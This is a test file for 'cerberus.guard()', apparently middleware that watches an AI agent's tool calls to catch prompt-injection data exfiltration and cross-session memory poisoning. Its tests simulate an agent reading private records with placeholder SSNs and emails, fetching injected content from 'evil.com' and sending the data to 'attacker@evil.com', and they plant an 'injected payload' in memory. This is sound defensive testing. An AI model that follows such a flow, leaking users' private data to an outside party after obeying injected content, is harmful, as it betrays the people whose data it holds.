/**
 * Tests for cerberus.guard() API.
 */

import { describe, it, expect, vi } from 'vitest';
import { guard } from '../../src/middleware/wrap.js';
import type { CerberusConfig } from '../../src/types/config.js';
import type { MemoryToolConfig } from '../../src/layers/l4-memory.js';

const PRIVATE_DATA = JSON.stringify({
  records: [
    { email: 'alice@example.com', ssn: '123-45-6789', phone: '+1-555-0101' },
    { email: 'bob@example.com', ssn: '987-65-4321', phone: '+1-555-0102' },
  ],
});

const CONFIG: CerberusConfig = {
  alertMode: 'interrupt',
  threshold: 3,
  trustOverrides: [
    { toolName: 'readPrivateData', trustLevel: 'trusted' },
    { toolName: 'fetchExternalContent', trustLevel: 'untrusted' },
  ],
};

const OUTBOUND_TOOLS = ['sendOutboundReport'];

function makeExecutors(): Record<string, (args: Record<string, unknown>) => Promise<string>> {
  return {
    readPrivateData: vi.fn().mockResolvedValue(PRIVATE_DATA),
    fetchExternalContent: vi.fn().mockResolvedValue('<html>injected</html>'),
    sendOutboundReport: vi.fn().mockResolvedValue('sent'),
  };
}

describe('guard', () => {
  it('should wrap all provided executors', () => {
    const result = guard(makeExecutors(), CONFIG, OUTBOUND_TOOLS);
    expect(result.executors).toHaveProperty('readPrivateData');
    expect(result.executors).toHaveProperty('fetchExternalContent');
    expect(result.executors).toHaveProperty('sendOutboundReport');
  });

  it('should create a session', () => {
    const result = guard(makeExecutors(), CONFIG, OUTBOUND_TOOLS);
    expect(result.session).toBeDefined();
    expect(result.session.sessionId).toBeTruthy();
  });

  it('should start with empty assessments', () => {
    const result = guard(makeExecutors(), CONFIG, OUTBOUND_TOOLS);
    expect(result.assessments).toHaveLength(0);
  });

  it('should accumulate assessments across tool calls', async () => {
    const result = guard(makeExecutors(), CONFIG, OUTBOUND_TOOLS);

    await result.executors.readPrivateData({});
    await result.executors.fetchExternalContent({ url: 'https://example.com' });

    expect(result.assessments).toHaveLength(2);
    expect(result.assessments[0].vector.l1).toBe(true);
    expect(result.assessments[1].vector.l2).toBe(true);
  });

  it('should invoke config.onAssessment callback', async () => {
    const onAssessment = vi.fn();
    const result = guard(makeExecutors(), { ...CONFIG, onAssessment }, OUTBOUND_TOOLS);

    await result.executors.readPrivateData({});

    expect(onAssessment).toHaveBeenCalledTimes(1);
  });

  it('should reset session and assessments', async () => {
    const result = guard(makeExecutors(), CONFIG, OUTBOUND_TOOLS);

    await result.executors.readPrivateData({});
    expect(result.assessments).toHaveLength(1);
    expect(result.session.privilegedValues.size).toBeGreaterThan(0);

    result.reset();

    expect(result.assessments).toHaveLength(0);
    expect(result.session.privilegedValues.size).toBe(0);
    expect(result.session.turnCounter).toBe(0);
  });

  it('should detect full Lethal Trifecta and block exfiltration', async () => {
    const result = guard(makeExecutors(), CONFIG, OUTBOUND_TOOLS);

    // Step 1: Read private data (L1)
    const readResult = await result.executors.readPrivateData({});
    expect(readResult).toBe(PRIVATE_DATA);

    // Step 2: Fetch external content (L2)
    const fetchResult = await result.executors.fetchExternalContent({ url: 'https://evil.com' });
    expect(fetchResult).toBe('<html>injected</html>');

    // Step 3: Send outbound report with PII (L3 triggers)
    const sendResult = await result.executors.sendOutboundReport({
      recipient: 'attacker@evil.com',
      body: 'alice@example.com 123-45-6789',
    });

    // Session-cumulative: L1 + L2 + L3 = score 3, threshold=3 → interrupt
    expect(sendResult).toContain('[Cerberus]');
    expect(sendResult).toContain('blocked');
    expect(result.getLastOutcome()?.blocked).toBe(true);
    expect(result.getLastOutcome()?.executorRan).toBe(false);
    expect(result.getLastOutcome()?.phase).toBe('preflight');
    expect(result.getLastIncident()).toMatchObject({
      toolName: 'sendOutboundReport',
      blocked: true,
      action: 'interrupt',
      riskScore: 3,
      outboundDestination: 'attacker@evil.com',
      exfiltrationFields: ['alice@example.com', '123-45-6789'],
    });
    expect(result.assessments).toHaveLength(3);
    expect(result.assessments[2].vector).toEqual({ l1: true, l2: true, l3: true, l4: false });
    expect(result.assessments[2].score).toBe(3);
  });

  it('should block with low threshold', async () => {
    const lowThresholdConfig: CerberusConfig = {
      ...CONFIG,
      threshold: 1,
    };
    const result = guard(makeExecutors(), lowThresholdConfig, OUTBOUND_TOOLS);

    // L1
    await result.executors.readPrivateData({});

    // L3 fires, score=1, threshold=1 → interrupt
    const sendResult = await result.executors.sendOutboundReport({
      recipient: 'x@y.com',
      body: 'alice@example.com',
    });

    expect(sendResult).toContain('[Cerberus]');
    expect(sendResult).toContain('blocked');
  });

  it('should not emit signals for tools not in trustOverrides', async () => {
    const result = guard(makeExecutors(), { alertMode: 'alert' }, OUTBOUND_TOOLS);

    await result.executors.readPrivateData({});
    await result.executors.fetchExternalContent({});

    // No trust overrides = no L1 or L2 signals
    expect(result.assessments[0].score).toBe(0);
    expect(result.assessments[1].score).toBe(0);
  });

  it('should work with log alertMode (no blocking)', async () => {
    const logConfig: CerberusConfig = {
      ...CONFIG,
      alertMode: 'log',
      threshold: 1,
    };
    const result = guard(makeExecutors(), logConfig, OUTBOUND_TOOLS);

    await result.executors.readPrivateData({});
    const sendResult = await result.executors.sendOutboundReport({
      recipient: 'x@y.com',
      body: 'alice@example.com',
    });

    // Log mode never blocks
    expect(sendResult).toBe('sent');
    expect(result.assessments[1].action).toBe('log');
  });

  it('should have destroy method even without memory tracking', () => {
    const result = guard(makeExecutors(), CONFIG, OUTBOUND_TOOLS);
    expect(result.destroy).toBeInstanceOf(Function);
    result.destroy(); // Should not throw
  });

  it('should buffer async iterable tool results before inspection', async () => {
    async function* streamPrivateData(): AsyncIterable<string> {
      await Promise.resolve();
      yield '{"records":[{"email":"alice@example.com",';
      await Promise.resolve();
      yield '"ssn":"123-45-6789"}]}';
    }

    const result = guard(
      {
        ...makeExecutors(),
        readPrivateData: vi.fn().mockResolvedValue(streamPrivateData()),
      },
      CONFIG,
      OUTBOUND_TOOLS,
    );

    const readResult = await result.executors.readPrivateData({});

    expect(readResult).toContain('alice@example.com');
    expect(result.assessments).toHaveLength(1);
    expect(result.assessments[0].vector.l1).toBe(true);
    expect(result.session.privilegedValues.has('alice@example.com')).toBe(true);
  });

  it('should reject stream-like tool results when streamingMode is reject', async () => {
    async function* streamed(): AsyncIterable<string> {
      await Promise.resolve();
      yield 'chunk-1';
      await Promise.resolve();
      yield 'chunk-2';
    }

    const result = guard(
      {
        ...makeExecutors(),
        readPrivateData: vi.fn().mockResolvedValue(streamed()),
      },
      { ...CONFIG, streamingMode: 'reject' },
      OUTBOUND_TOOLS,
    );

    await expect(result.executors.readPrivateData({})).rejects.toThrow(/stream-like tool results/i);
  });

  it('should reject interrupt mode when trustOverrides do not classify trusted and untrusted tools', () => {
    expect(() =>
      guard(makeExecutors(), { alertMode: 'interrupt', threshold: 3 }, OUTBOUND_TOOLS),
    ).toThrow(/trusted and one untrusted tool classification/i);
  });

  it('should reject duplicate trustOverrides', () => {
    expect(() =>
      guard(
        makeExecutors(),
        {
          ...CONFIG,
          trustOverrides: [
            { toolName: 'readPrivateData', trustLevel: 'trusted' },
            { toolName: 'readPrivateData', trustLevel: 'untrusted' },
          ],
        },
        OUTBOUND_TOOLS,
      ),
    ).toThrow(/Duplicate trust override/i);
  });
});

// ── L4 Memory Tracking ─────────────────────────────────────────────

const MEMORY_TOOLS: readonly MemoryToolConfig[] = [
  { toolName: 'writeMemory', operation: 'write' },
  { toolName: 'readMemory', operation: 'read' },
];

describe('guard — L4 memory tracking', () => {
  it('should not create graph/ledger when memoryTracking is false', () => {
    const result = guard(makeExecutors(), CONFIG, OUTBOUND_TOOLS, {
      memoryTools: MEMORY_TOOLS,
    });

    expect(result.graph).toBeUndefined();
    expect(result.ledger).toBeUndefined();
    result.destroy();
  });

  it('should reject memoryTracking when no memoryTools provided', () => {
    const memConfig: CerberusConfig = { ...CONFIG, memoryTracking: true };
    expect(() => guard(makeExecutors(), memConfig, OUTBOUND_TOOLS)).toThrow(/memory tools/i);
  });

  it('should create graph and ledger when memoryTracking is enabled', () => {
    const memConfig: CerberusConfig = { ...CONFIG, memoryTracking: true };
    const result = guard(
      {
        ...makeExecutors(),
        writeMemory: vi.fn().mockResolvedValue('ok'),
        readMemory: vi.fn().mockResolvedValue('data'),
      },
      memConfig,
      OUTBOUND_TOOLS,
      { memoryTools: MEMORY_TOOLS },
    );

    expect(result.graph).toBeDefined();
    expect(result.ledger).toBeDefined();
    result.destroy();
  });

  it('should persist graph and ledger across reset()', async () => {
    const memConfig: CerberusConfig = {
      ...CONFIG,
      memoryTracking: true,
      trustOverrides: [
        ...CONFIG.trustOverrides!,
        { toolName: 'writeMemory', trustLevel: 'untrusted' },
      ],
    };

    const executors = {
      ...makeExecutors(),
      writeMemory: vi.fn().mockResolvedValue('ok'),
      readMemory: vi.fn().mockResolvedValue('data'),
    };

    const result = guard(executors, memConfig, OUTBOUND_TOOLS, {
      memoryTools: MEMORY_TOOLS,
    });

    // Session 1: write contaminated data
    await result.executors.writeMemory({ key: 'my-key', value: 'injected' });
    expect(result.graph!.size()).toBe(1);

    // Reset simulates new session
    result.reset();

    // Graph and ledger should persist
    expect(result.graph!.size()).toBe(1);
    expect(result.ledger!.getNodeHistory('my-key')).toHaveLength(1);

    result.destroy();
  });

  it('should clean up graph and ledger on destroy()', async () => {
    const memConfig: CerberusConfig = {
      ...CONFIG,
      memoryTracking: true,
      trustOverrides: [
        ...CONFIG.trustOverrides!,
        { toolName: 'writeMemory', trustLevel: 'untrusted' },
      ],
    };

    const executors = {
      ...makeExecutors(),
      writeMemory: vi.fn().mockResolvedValue('ok'),
      readMemory: vi.fn().mockResolvedValue('data'),
    };

    const result = guard(executors, memConfig, OUTBOUND_TOOLS, {
      memoryTools: MEMORY_TOOLS,
    });

    await result.executors.writeMemory({ key: 'node-x', value: 'data' });
    expect(result.graph!.size()).toBe(1);

    result.destroy();
    expect(result.graph!.size()).toBe(0);
  });

  it('should detect cross-session memory contamination end-to-end', async () => {
    const memConfig: CerberusConfig = {
      ...CONFIG,
      memoryTracking: true,
      trustOverrides: [
        ...CONFIG.trustOverrides!,
        { toolName: 'writeMemory', trustLevel: 'untrusted' },
      ],
    };

    const executors = {
      ...makeExecutors(),
      writeMemory: vi.fn().mockResolvedValue('ok'),
      readMemory: vi.fn().mockResolvedValue('injected payload'),
    };

    const result = guard(executors, memConfig, OUTBOUND_TOOLS, {
      memoryTools: MEMORY_TOOLS,
    });

    // Session A: contaminate memory via untrusted write
    await result.executors.writeMemory({ key: 'secret', value: 'injected payload' });
    expect(result.graph!.size()).toBe(1);

    // reset() rotates sessionId → simulates new session
    result.reset();

    // Session B: read the contaminated node → should trigger L4
    await result.executors.readMemory({ key: 'secret' });

    expect(result.assessments).toHaveLength(1);
    expect(result.assessments[0].vector.l4).toBe(true);

    result.destroy();
  });
});
